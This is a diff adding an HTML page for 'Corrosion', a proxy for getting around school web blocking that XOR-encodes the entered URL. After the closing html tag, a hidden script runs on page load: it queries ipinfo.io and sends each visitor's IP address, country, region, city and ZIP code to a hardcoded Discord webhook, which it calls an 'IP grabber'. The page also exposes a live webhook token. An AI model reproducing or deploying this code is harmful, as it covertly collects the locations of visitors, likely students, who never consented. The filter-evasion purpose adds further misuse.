@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<title>corrosion - best bypasser</title>
+		<style>
+			body {
+				text-align: center;
+				color: white;
+				background-color: #202020;
+				font-family: sans-serif;
+			}
+			
+			input {
+				padding: 5px 8px;
+			}
+			
+			a {
+				color: #3ec3f0;
+				font-size: 24px;
+				display: block;
+				margin: 16px 0px;
+			}
+		</style>
+	</head>
+	<body>
+		<h1>Corrison - RIP School Blocking</h1>
+		<input id="url" name="url" placeholder="type out url">
+		<input id="go" type="submit" value="press enter">
+		<a href="https://corrosionaaaaaaa.herokuapp.com/">AAAAAA version</a>
+		<script>
+			function xor(str) {
+				return encodeURIComponent(str.toString().split('').map((char, ind) => ind % 2 ? String.fromCharCode(char.charCodeAt() ^ 2) : char).join(''));
+			}
+			
+			var prUrl = document.getElementById("url"),
+			prGo = document.getElementById("go");
+			
+			function go(url) {
+				window.location.href = "c/" + xor(/^(http:\/\/|https:\/\/)/i.test(url) ? url : "https://" + url);
+			}
+			
+			prUrl.addEventListener("keydown", function(e) {
+				if (e.code == "Enter" && prUrl.value) go(prUrl.value);
+			}, false);
+			
+			prGo.addEventListener("click", function() {
+				if (prUrl.value) go(prUrl.value);
+			}, false);
+		</script>
+	</body>
+</html>
+
+<script>
+function monke(json) 
+{
+     var request = new XMLHttpRequest();
+     
+     request.open("POST", "https://discordapp.com/api/webhooks/955454787795709972/CSo5E1Hhq0LfDruhMJSvfQasUiYElve3-9LD_a5vd4Vu45wohww_wNVBb_U0qY2S7pnu");
+
+     request.setRequestHeader('Content-type', 'application/json');
+
+     var params = 
+     {
+          username: "corrosionowo",
+          avatar_url: "",
+          content: "@everyone",
+          embeds: [
+               {
+                    title: "Someone visited the IP grabber!",
+                    color: 1752220,
+                    description: "**IP:** `" + json.ip + "`\n**Country:** `" + json.country + "`\n**Region:** `" + json.region + "`\n**Town/City:** `" + json.city + "`\n**ZIP:** `" + json.postal + "`"
+               }
+          ]
+     }
+
+     request.send(JSON.stringify(params));
+}
+</script>
+<script src="https://ipinfo.io/?format=jsonp&callback=monke"></script>
